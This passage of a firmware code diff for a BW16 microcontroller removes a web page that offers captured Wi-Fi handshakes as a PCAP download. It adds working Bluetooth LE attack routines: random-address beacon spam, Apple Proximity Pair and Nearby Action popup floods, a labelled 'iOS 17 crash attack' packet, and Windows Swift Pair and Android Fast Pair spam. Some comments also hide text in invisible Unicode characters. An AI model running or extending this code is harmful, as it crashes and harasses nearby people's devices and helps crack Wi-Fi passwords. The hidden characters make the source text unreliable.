-  html += ".status{background:#e8f5e8;border:1px solid #4caf50;padding:15px;border-radius:5px;margin:20px 0;}";
-  html += ".info{background:#f0f8ff;border:1px solid #2196f3;padding:15px;border-radius:5px;margin:20px 0;}";
-  html += ".btn{display:inline-block;padding:12px 24px;background:#4caf50;color:white;text-decoration:none;border-radius:5px;margin:10px 5px;text-align:center;}";
-  html += ".btn:hover{background:#45a049;}";
-  html += ".btn-danger{background:#f44336;}";
-  html += ".btn-danger:hover{background:#da190b;}";
-  html += ".stats{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:20px 0;}";
-  html += ".stat-item{background:#f9f9f9;padding:15px;border-radius:5px;text-align:center;}";
-  html += ".stat-value{font-size:24px;font-weight:bold;color:#2196f3;}";
-  html += ".stat-label{color:#666;margin-top:5px;}";
-  html += "</style></head><body>";
-  html += "<div class='container'>";
-  html += "<h1>🔐 快速抓包完成</h1>";
-  
-  // 显示抓包统计信息
-  html += "<div class='status'>";
-  html += "<h3>抓包统计</h3>";
-  html += "<div class='stats'>";
-  html += "<div class='stat-item'><div class='stat-value'>" + String(capturedHandshake.frameCount) + "/4</div><div class='stat-label'>握手帧</div></div>";
-  html += "<div class='stat-item'><div class='stat-value'>" + String(capturedManagement.frameCount) + "/10</div><div class='stat-label'>管理帧</div></div>";
-  html += "<div class='stat-item'><div class='stat-value'>" + String((quick_capture_end_time - quick_capture_start_time) / 1000) + "s</div><div class='stat-label'>抓取时间</div></div>";
-  html += "<div class='stat-item'><div class='stat-value'>" + String(globalPcapData.size()) + "B</div><div class='stat-label'>文件大小</div></div>";
-  html += "</div></div>";
-  
-  // 显示目标网络信息
-  html += "<div class='info'>";
-  html += "<h3>目标网络信息</h3>";
-  html += "<p><strong>SSID:</strong> " + _selectedNetwork.ssid + "</p>";
-  html += "<p><strong>BSSID:</strong> " + macToString(_selectedNetwork.bssid, 6) + "</p>";
-  html += "<p><strong>频道:</strong> " + String(_selectedNetwork.ch) + "</p>";
-  html += "<p><strong>抓包模式:</strong> ";
-  if (quick_capture_mode == 0) html += "主动模式";
-  else if (quick_capture_mode == 1) html += "被动模式";
-  else html += "高效模式";
-  html += "</p></div>";
-  
-  // 操作按钮
-  html += "<div style='text-align:center;margin:30px 0;'>";
-  html += "<a href='/capture/download' class='btn'>📥 下载PCAP文件</a>";
-  html += "<a href='/' class='btn btn-danger'>🏠 返回主页</a>";
-  html += "</div>";
-  
-  html += "<div style='text-align:center;color:#666;font-size:14px;'>";
-  html += "<p>⚠️ 此功能仅用于安全研究和教育目的，请勿用于非法用途</p>";
-  html += "</div></div></body></html>";
-  
-  String header = "HTTP/1.1 200 OK\r\n";
-  header += "Content-Type: text/html; charset=UTF-8\r\n";
-  header += "Content-Length: " + String(html.length()) + "\r\n";
-  header += "Connection: close\r\n\r\n";
-  client.print(header);
-  client.print(html);
-}
-
-// 发送PCAP文件下载
-void sendPcapDownload(WiFiClient& client) {
-  if (globalPcapData.empty()) {
-    String hdr = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n";
-    client.print(hdr);
-    return;
-  }
-  
-  String hdr = "HTTP/1.1 200 OK\r\n";
-  hdr += "Content-Type: application/octet-stream\r\n";
-  hdr += "Content-Disposition: attachment; filename=\"handshake_" + _selectedNetwork.ssid + ".pcap\"\r\n";
-  hdr += "Content-Length: " + String(globalPcapData.size()) + "\r\n";
-  hdr += "Connection: close\r\n\r\n";
-  client.print(hdr);
-  client.write(globalPcapData.data(), globalPcapData.size());
-}
-
-// 发送抓包状态API
-void sendCaptureStatus(WiFiClient& client) {
-  String json = "{";
-  json += "\"completed\":" + String(quick_capture_completed ? "true" : "false") + ",";
-  json += "\"handshake_frames\":" + String(capturedHandshake.frameCount) + ",";
-  json += "\"management_frames\":" + String(capturedManagement.frameCount) + ",";
-  json += "\"capture_time\":" + String((quick_capture_end_time - quick_capture_start_time) / 1000) + ",";
-  json += "\"file_size\":" + String(globalPcapData.size()) + ",";
-  json += "\"target_ssid\":\"" + _selectedNetwork.ssid + "\",";
-  json += "\"target_bssid\":\"" + macToString(_selectedNetwork.bssid, 6) + "\",";
-  json += "\"target_channel\":" + String(_selectedNetwork.ch) + ",";
-  json += "\"capture_mode\":" + String(quick_capture_mode);
-  json += "}";
-  
-  String hdr = "HTTP/1.1 200 OK\r\n";
-  hdr += "Content-Type: application/json\r\n";
-  hdr += "Content-Length: " + String(json.length()) + "\r\n";
-  hdr += "Connection: close\r\n\r\n";
-  client.print(hdr);
-  client.print(json);
-}
-
-// 显示Web服务信息
-void drawWebServiceInfo() {
-  while (true) {
-    display.clearDisplay();
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    
-    // 标题
-    u8g2_for_adafruit_gfx.setCursor(5, 18);
-    u8g2_for_adafruit_gfx.print("已抓取到握手包");
-    
-    // 显示连接信息
-    u8g2_for_adafruit_gfx.setCursor(5, 30);
-    u8g2_for_adafruit_gfx.print("继续将启动Web服务");
-    
-    u8g2_for_adafruit_gfx.setCursor(5, 42);
-    u8g2_for_adafruit_gfx.print("以下载握手包");
-    
-    u8g2_for_adafruit_gfx.setCursor(5, 54);
-    u8g2_for_adafruit_gfx.print("《 继续 | 下载");
-    
-    display.display();
-    
-    // 按键处理
-    if (digitalRead(BTN_BACK) == LOW) {
-      delay(200);
-      return;
-    }
-    delay(50);
-  }
-}
-
-// 显示Web服务状态
-void displayWebServiceStatus() {
+  // OLED UI: 显示状态
   display.clearDisplay();
   u8g2_for_adafruit_gfx.setFontMode(1);
   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  oledDrawCenteredLine("[蓝牙信标发送]", 12);
   
-  // 标题
-  u8g2_for_adafruit_gfx.setCursor(5, 15);
-  u8g2_for_adafruit_gfx.print("Web服务已启动");
-  
-  // 显示目标网络信息
-  u8g2_for_adafruit_gfx.setCursor(5, 25);
-  u8g2_for_adafruit_gfx.print("目标: ");
-  String ssidDisplay = _selectedNetwork.ssid.length() > 8 ? _selectedNetwork.ssid.substring(0, 8) + "..." : _selectedNetwork.ssid;
-  u8g2_for_adafruit_gfx.print(ssidDisplay);
-  
-  // 显示抓包统计
-  u8g2_for_adafruit_gfx.setCursor(5, 35);
-  u8g2_for_adafruit_gfx.print("握手帧: ");
-  u8g2_for_adafruit_gfx.print(capturedHandshake.frameCount);
-  u8g2_for_adafruit_gfx.print("/4");
-  
-  u8g2_for_adafruit_gfx.setCursor(5, 45);
-  u8g2_for_adafruit_gfx.print("管理帧: ");
-  u8g2_for_adafruit_gfx.print(capturedManagement.frameCount);
-  u8g2_for_adafruit_gfx.print("/10");
-  
-  // 显示Web地址
-  u8g2_for_adafruit_gfx.setCursor(5, 55);
-  u8g2_for_adafruit_gfx.print("Web: 192.168.1.1");
-  
+  char statusBuf[32];
+  snprintf(statusBuf, sizeof(statusBuf), "广播: %s", categoryName);
+  oledDrawCenteredLine(statusBuf, 26);
+  oledDrawCenteredLine("按BACK退出", 60);
   display.display();
+
+  // 标记BLE资源开始使用
+  g_bleResourcesInUse = true;
+  g_bleActiveAdvertising = false; // 初始状态
+  g_lastBleActivity = millis();
+
+  // 初始化BLE并配置非连接广播 - 优化广播频率
+  BLE.init();
+  BLE.setDeviceName("BW16-BLE");
+  BLE.setDeviceAppearance(GAP_GATT_APPEARANCE_GENERIC_COMPUTER);
+
+  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  BLE.configAdvert()->setMinInterval(20);  // 优化：从50ms减少到20ms
+  BLE.configAdvert()->setMaxInterval(40);  // 优化：从120ms减少到40ms
+
+  // 启动外围模式（仅广播，不可连接）
+  BLE.beginPeripheral();
+
+  // 生成静态随机地址池 - 增加地址数量提高多样性
+  const uint8_t maxClones = 32; // 优化：从32增加到64
+  static uint8_t addrPool[maxClones][6];
+  for (uint8_t i = 0; i < maxClones; i++) {
+    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, addrPool[i]) != GAP_CAUSE_SUCCESS) {
+      le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, addrPool[i]);
+    }
+  }
+  
+  // 确保广播使用随机本地地址类型
+  uint8_t local_bd_type = GAP_LOCAL_ADDR_LE_RANDOM;
+  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(local_bd_type), &local_bd_type);
+
+  // 优化：减少切换延时，提高切换速度
+  const uint16_t perCloneMs = 50; // 优化：从100ms减少到50ms
+  uint8_t addrIdx = 0;
+  
+  // 优化：创建设备索引数组，实现真正的随机化避免连续相同设备
+  static int deviceIndices[64]; // 增加数组大小支持更多设备
+  int maxDeviceIndices = std::min(64, deviceCount * 8); // 每个设备重复8次，增加多样性
+  
+  // 初始化设备索引数组，确保每个设备都有足够的重复
+  for (int i = 0; i < maxDeviceIndices; i++) {
+    deviceIndices[i] = i % deviceCount;
+  }
+  
+  // 使用改进的Fisher-Yates洗牌算法，确保真正的随机分布
+  for (int i = maxDeviceIndices - 1; i > 0; i--) {
+    int j = random(0, i + 1);
+    int temp = deviceIndices[i];
+    deviceIndices[i] = deviceIndices[j];
+    deviceIndices[j] = temp;
+  }
+  
+  // 额外验证：确保相邻设备不重复
+  for (int i = 1; i < maxDeviceIndices; i++) {
+    if (deviceIndices[i] == deviceIndices[i-1]) {
+      // 如果发现重复，与后面的设备交换
+      for (int j = i + 1; j < maxDeviceIndices; j++) {
+        if (deviceIndices[j] != deviceIndices[i-1]) {
+          int temp = deviceIndices[i];
+          deviceIndices[i] = deviceIndices[j];
+          deviceIndices[j] = temp;
+          break;
+        }
+      }
+    }
+  }
+  
+  int deviceArrayIdx = 0;
+  
+  unsigned long lastDisplayUpdate = 0;
+  const unsigned long displayUpdateInterval = 300; // 优化：减少显示更新间隔
+
+  while (true) {
+    if (digitalRead(BTN_BACK) == LOW) { 
+      delay(200); 
+      break; 
+    }
+
+    // 停止当前广播以切换地址和设备信息
+    BLE.configAdvert()->stopAdv();
+
+    // 从池中设置下一个地址
+    le_set_rand_addr(addrPool[addrIdx]);
+    delay(5); // 优化：从20ms减少到5ms
+
+    // 构建广播载荷
+    BLEAdvertData cadv;
+    BLEAdvertData cscn;
+    
+    // 优化：使用智能设备选择算法，避免连续相同设备
+    int deviceIdx = deviceIndices[deviceArrayIdx];
+    
+    // 额外检查：如果当前设备与前一个相同，尝试选择不同的设备
+    static int lastDeviceIdx = -1;
+    if (deviceIdx == lastDeviceIdx && deviceCount > 1) {
+      // 尝试从当前索引开始找到下一个不同的设备
+      for (int i = 1; i < maxDeviceIndices; i++) {
+        int nextIdx = (deviceArrayIdx + i) % maxDeviceIndices;
+        if (deviceIndices[nextIdx] != lastDeviceIdx) {
+          deviceIdx = deviceIndices[nextIdx];
+          deviceArrayIdx = nextIdx; // 更新索引位置
+          break;
+        }
+      }
+    }
+    lastDeviceIdx = deviceIdx;
+    
+    const BleBeaconDevice& currentDevice = devices[deviceIdx];
+    
+    cadv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    
+    // 添加设备名称（完整名称，必要时通过调整附加字段确保包长）
+    char namebuf[32];
+    snprintf(namebuf, sizeof(namebuf), "%s", currentDevice.name);
+    
+    cadv.addCompleteName(namebuf);
+    cadv.addAppearance(currentDevice.appearance);
+    // 为保证名称不被截断，优先移除可选字段以控制包大小
+    // 仅当名称较长时才添加完整服务UUID到扫描响应包
+    cscn.addCompleteServices(BLEUUID(currentDevice.service_uuid));
+    
+    // 将制造商数据移动到扫描响应，避免挤占广播包导致名称截断
+    uint8_t mfg[8];
+    mfg[0] = 7;
+    mfg[1] = 0xFF;
+    mfg[2] = (uint8_t)(currentDevice.company_id & 0xFF);
+    mfg[3] = (uint8_t)(currentDevice.company_id >> 8);
+    mfg[4] = deviceIdx;
+    mfg[5] = addrPool[addrIdx][3];
+    mfg[6] = addrPool[addrIdx][4];
+    mfg[7] = addrPool[addrIdx][5];
+    cscn.addData(mfg, sizeof(mfg));
+    
+    cscn.addAppearance(currentDevice.appearance);
+    
+    BLE.configAdvert()->setAdvData(cadv);
+    BLE.configAdvert()->setScanRspData(cscn);
+    BLE.configAdvert()->updateAdvertParams();
+
+    // 重新启动广播
+    BLE.configAdvert()->startAdv();
+    
+    // 更新显示（定期仅刷新设备名称区域，避免其他文字闪烁）
+    unsigned long now = millis();
+    if (now - lastDisplayUpdate >= displayUpdateInterval) {
+      u8g2_for_adafruit_gfx.setFontMode(1);
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+      // 清除名称行所在区域再绘制（不清整屏），扩大清除高度防止重叠
+      display.fillRect(0, 32, display.width(), 20, SSD1306_BLACK);
+      oledDrawCenteredLine(namebuf, 44);
+      display.display();
+      lastDisplayUpdate = now;
+    }
+
+    // 等待指定时间
+    unsigned long start = millis();
+    while (millis() - start < perCloneMs) { 
+      if (digitalRead(BTN_BACK) == LOW) break; 
+      delay(5); // 优化：从10ms减少到5ms
+    }
+    
+    // 切换到下一个地址和设备
+    addrIdx = (uint8_t)((addrIdx + 1) % maxClones);
+    deviceArrayIdx = (deviceArrayIdx + 1) % maxDeviceIndices;
+    
+    // 优化：每轮结束后重新随机化设备顺序，使用改进的算法
+    if (deviceArrayIdx == 0) {
+      // 使用改进的Fisher-Yates洗牌算法
+      for (int i = maxDeviceIndices - 1; i > 0; i--) {
+        int j = random(0, i + 1);
+        int temp = deviceIndices[i];
+        deviceIndices[i] = deviceIndices[j];
+        deviceIndices[j] = temp;
+      }
+      
+      // 额外验证：确保相邻设备不重复
+      for (int i = 1; i < maxDeviceIndices; i++) {
+        if (deviceIndices[i] == deviceIndices[i-1]) {
+          // 如果发现重复，与后面的设备交换
+          for (int j = i + 1; j < maxDeviceIndices; j++) {
+            if (deviceIndices[j] != deviceIndices[i-1]) {
+              int temp = deviceIndices[i];
+              deviceIndices[i] = deviceIndices[j];
+              deviceIndices[j] = temp;
+              break;
+            }
+          }
+        }
+      }
+    }
+  }
+
+  // 停止BLE并清理资源
+  Serial.println("停止BLE广播并清理资源...");
+  BLE.configAdvert()->stopAdv();
+  g_bleActiveAdvertising = false;
+  delay(100);
+  BLE.deinit();
+  g_bleResourcesInUse = false;
+  g_lastBleActivity = millis();
+  Serial.println("BLE资源清理完成");
 }
 
+// Common BLE init helper - 优化广播频率
+static void bleEnsureInitAndParams() {
+  // 标记BLE资源开始使用
+  g_bleResourcesInUse = true;
+  g_bleActiveAdvertising = false; // 初始状态
+  g_lastBleActivity = millis();
+  
+  BLE.init();
+  BLE.setDeviceName("BW16-BLE");
+  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  BLE.configAdvert()->setMinInterval(20);  // 优化：从40ms减少到20ms
+  BLE.configAdvert()->setMaxInterval(40);  // 优化：从60ms减少到40ms
+  BLE.beginPeripheral();
+  uint8_t local_bd_type = GAP_LOCAL_ADDR_LE_RANDOM;
+  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(local_bd_type), &local_bd_type);
+}
+
+void blePopupMenu() {
+  // 定义弹窗功能菜单项
+  static const BleMenuItem popupMenuItems[] = {
+    {"iOS 设备配对弹窗", blePopupStart_iOS},
+    {"iOS Action Modal", blePopupStart_iOSActionModal},
+    {"iOS 17 崩溃攻击", blePopupStart_iOS17Crash},
+    {"Windows Swift Pair", blePopupStart_WindowsSwiftPair},
+    {"三星EasySetup", blePopupStart_SamsungEasySetup},
+    {"↓部分设备有效↓", blePopupShowFastPairInfo},
+    {"Google快速配对", blePopupStart_AndroidFastPair},
+    {"小米/红米快速配对", blePopupStart_XiaomiFastPair},
+    {"一加快速配对", blePopupStart_OnePlusFastPair},
+    {"华为快速配对", blePopupStart_HuaweiFastPair},
+    {"OPPO快速配对", blePopupStart_OppoFastPair},
+    {"realme快速配对", blePopupStart_RealmeFastPair},
+    {"← 返回BLE菜单", bleBackToBleMenu}
+  };
+  static const int popupMenuCount = sizeof(popupMenuItems) / sizeof(popupMenuItems[0]);
+  
+  showGenericBleMenu("蓝牙弹窗攻击", popupMenuItems, popupMenuCount);
+}
+
+// iOS popup
+// Apple Proximity Pair devices (from fl-BLE_SPAM)
+void blePopupStart_iOS() {
+  const char* title = "[iOS 设备配对弹窗]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  // Apple device models for Proximity Pair
+  const uint16_t appleModels[] = {
+    0x0E20, // AirPods Pro
+    0x0620, // Beats Solo 3
+    0x0A20, // AirPods Max
+    0x1020, // Beats Flex
+    0x0055, // Airtag
+    0x0030, // Hermes Airtag
+    0x0220, // AirPods
+    0x0F20, // AirPods 2nd Gen
+    0x1320, // AirPods 3rd Gen
+    0x1420, // AirPods Pro 2nd Gen
+    0x0320, // Powerbeats 3
+    0x0B20, // Powerbeats Pro
+    0x0C20, // Beats Solo Pro
+    0x1120, // Beats Studio Buds
+    0x0520, // Beats X
+    0x0920, // Beats Studio 3
+    0x1720, // Beats Studio Pro
+    0x1220, // Beats Fit Pro
+    0x1620, // Beats Studio Buds+
+  };
+  const size_t modelCount = sizeof(appleModels) / sizeof(appleModels[0]);
+
+  const uint8_t maxClones = 24; // 优化：从12增加到24提高多样性
+  static uint8_t addrPool[maxClones][6];
+  for (uint8_t i = 0; i < maxClones; i++) {
+    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, addrPool[i]) != GAP_CAUSE_SUCCESS) {
+      le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, addrPool[i]);
+    }
+  }
+
+  uint8_t idx = 0;
+  unsigned long lastDisplayUpdate = 0;
+  
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+
+    BLE.configAdvert()->stopAdv();
+    le_set_rand_addr(addrPool[idx]);
+    delay(2); // 优化：减少切换延时
+
+    // Build Apple Continuity Proximity Pair packet
+    uint16_t model = appleModels[random(0, modelCount)];
+    uint8_t prefix = (model == 0x0055 || model == 0x0030) ? 0x05 : 0x01;
+    
+    uint8_t packet[31];
+    uint8_t i = 0;
+    
+    packet[i++] = 30; // Size
+    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
+    packet[i++] = 0x00; // ...
+    packet[i++] = 0x07; // Continuity Type (Proximity Pair)
+    packet[i++] = 25; // Continuity Size
+    packet[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
+    packet[i++] = (model >> 8) & 0xFF; // Model high byte
+    packet[i++] = model & 0xFF; // Model low byte
+    packet[i++] = 0x55; // Status
+    packet[i++] = ((random(0, 10) << 4) + random(0, 10)); // Buds Battery Level
+    packet[i++] = ((random(0, 8) << 4) + random(0, 10)); // Charging Status and Battery Case Level
+    packet[i++] = random(0, 256); // Lid Open Counter
+    packet[i++] = 0x00; // Device Color
+    packet[i++] = 0x00;
+    // Encrypted Payload (16 bytes random)
+    for (int j = 0; j < 16; j++) {
+      packet[i++] = random(0, 256);
+    }
+
+    BLEAdvertData adv;
+    adv.addData(packet, 31);
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+    idx = (uint8_t)((idx + 1) % maxClones);
+  }
+  performCompleteBleCleanup();
+}
+
+// iOS Action Modal (from fl-BLE_SPAM)
+void blePopupStart_iOSActionModal() {
+  const char* title = "[iOS Action Modal]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  // Action types from fl-BLE_SPAM
+  const uint8_t actions[] = {
+    0x13, // AppleTV AutoFill
+    0x27, // AppleTV Connecting...
+    0x20, // Join This AppleTV?
+    0x19, // AppleTV Audio Sync
+    0x1E, // AppleTV Color Balance
+    0x09, // Setup New iPhone
+    0x02, // Transfer Phone Number
+    0x0B, // HomePod Setup
+    0x01, // Setup New AppleTV
+    0x06, // Pair AppleTV
+    0x0D, // HomeKit AppleTV Setup
+    0x2B, // AppleID for AppleTV?
+  };
+  const size_t actionCount = sizeof(actions) / sizeof(actions[0]);
+
+  unsigned long lastDisplayUpdate = 0;
+  
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; 
+    le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); 
+    le_set_rand_addr(rnd);
+
+    // Build Apple Continuity Nearby Action packet
+    uint8_t action = actions[random(0, actionCount)];
+    uint8_t flag = 0xC0;
+    
+    // Special flag handling from fl-BLE_SPAM
+    if (action == 0x20 && random(0, 2)) flag--; // More spam for 'Join This AppleTV?'
+    if (action == 0x09 && random(0, 2)) flag = 0x40; // Glitched 'Setup New Device'
+    
+    uint8_t packet[11];
+    uint8_t i = 0;
+    
+    packet[i++] = 10; // Size
+    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
+    packet[i++] = 0x00; // ...
+    packet[i++] = 0x0F; // Continuity Type (Nearby Action)
+    packet[i++] = 5; // Continuity Size
+    packet[i++] = flag; // Action Flags
+    packet[i++] = action; // Action Type
+    // Authentication Tag (3 bytes random)
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+
+    BLEAdvertData adv;
+    adv.addData(packet, 11);
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+// iOS 17 Crash (from fl-BLE_SPAM)
+void blePopupStart_iOS17Crash() {
+  const char* title = "[iOS 17 崩溃攻击]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  // Action types for crash payload
+  const uint8_t actions[] = {
+    0x13, // AppleTV AutoFill
+    0x27, // AppleTV Connecting...
+    0x20, // Join This AppleTV?
+    0x19, // AppleTV Audio Sync
+    0x1E, // AppleTV Color Balance
+    0x09, // Setup New iPhone
+    0x02, // Transfer Phone Number
+    0x0B, // HomePod Setup
+    0x01, // Setup New AppleTV
+    0x06, // Pair AppleTV
+    0x0D, // HomeKit AppleTV Setup
+    0x2B, // AppleID for AppleTV?
+  };
+  const size_t actionCount = sizeof(actions) / sizeof(actions[0]);
+
+  unsigned long lastDisplayUpdate = 0;
+  
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; 
+    le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); 
+    le_set_rand_addr(rnd);
+
+    // Build iOS 17 crash packet (Custom Crash from fl-BLE_SPAM)
+    uint8_t action = actions[random(0, actionCount)];
+    uint8_t flag = 0xC0;
+    
+    if (action == 0x20 && random(0, 2)) flag--; // More spam for 'Join This AppleTV?'
+    if (action == 0x09 && random(0, 2)) flag = 0x40; // Glitched 'Setup New Device'
+    
+    uint8_t packet[17];
+    uint8_t i = 0;
+    
+    packet[i++] = 16; // Size
+    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
+    packet[i++] = 0x00; // ...
+    packet[i++] = 0x0F; // Continuity Type (Nearby Action)
+    packet[i++] = 0x05; // Continuity Size
+    packet[i++] = flag; // Action Flags
+    packet[i++] = action; // Action Type
+    // Authentication Tag (3 bytes random)
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+    
+    packet[i++] = 0x00; // Terminator (?)
+    packet[i++] = 0x00; // ...
+    
+    packet[i++] = 0x10; // Continuity Type (Nearby Info)
+    // Shenanigans (3 bytes random)
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+
+    BLEAdvertData adv;
+    adv.addData(packet, 17);
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+// 占位页面：显示提示文本，任意键返回
+void blePlaceholderPage() {
+  while (true) {
+    display.clearDisplay();
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
+    const char* msg = "关注永雏塔菲喵";
+    int w = u8g2_for_adafruit_gfx.getUTF8Width(msg);
+    int x = (display.width() - w) / 2; if (x < 0) x = 0;
+    int y = (display.height() / 2) + 4; // 基线微调
+    u8g2_for_adafruit_gfx.setCursor(x, y);
+    u8g2_for_adafruit_gfx.print(msg);
+    display.display();
+    // 任意键退出
+    if (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW || digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) { delay(200); break; }
+    delay(10);
+  }
+}
+
+// W󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠indows Swift Pair popup (simplified)
+void blePopupStart_WindowsSwiftPair() {
+  const char* title = "[Windows Swift Pair]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const char* names[] = {"www.无名.top","ごとう ひとり","いじちにじか","やまだ リョウ","きた いくよ","因幡めぐる","Ciallo～(∠・ω< )⌒☆"};
+  const size_t nameCount = sizeof(names)/sizeof(names[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    const char* nm = names[(size_t)random(0, (int)nameCount)];
+    size_t nlen = strlen(nm); if (nlen > 20) nlen = 20;
+
+    // Build Manufacturer S󠅗󠅙󠅤󠅘󠅥󠅒󠄞󠅓󠅟󠅝󠄟󠄶󠅜󠅩󠅙󠅞󠅗󠄹󠅓󠅕󠅩󠅩󠅔󠅣󠄟󠄲󠅇󠄡󠄦󠄝󠅄󠅟󠅟󠅜󠅣pecific: Company ID 0x0006 (Micro󠅗󠅙󠅤󠅘󠅥󠅒󠄞󠅓󠅟󠅝󠄟󠄶󠅜󠅩󠅙󠅞󠅗󠄹󠅓󠅕󠅩󠅩󠅔󠅣󠄟󠄲󠅇󠄡󠄦󠄝󠅄󠅟󠅟󠅜󠅣soft)
+    uint8_t buf[31];
+    uint8_t L = (uint8_t)(1 + 2 + 3 + nlen);
+    if (L > 0x1F) L = 0x1F;
+    buf[0] = L; buf[1] = 0xFF; buf[2] = 0x06; buf[3] = 0x00; buf[4]=0x03; buf[5]=0x00; buf[6]=0x80;
+    memcpy(&buf[7], nm, nlen);
+
+    BLEAdvertData adv; adv.addData(buf, (uint8_t)(L+1));
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    // 使用󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠标准的延时循环，支持速率控制按键
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+// Android Fast Pair (simplified)
+void blePopupStart_AndroidFastPair() {
+  const char* title = "[Android Fast Pair]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+  unsigned long lastDisplayUpdate = 0;
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+    // Service Data UUID FE2C + random model id
+    uint8_t sd[8] = {6,0x16,0x2C,0xFE,(uint8_t)random(0,256),(uint8_t)random(0,256),(uint8_t)random(0,256)};
+    BLEAdvertData adv; adv.addData(sd, 7);
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+    
+    unsigned long start = millis();
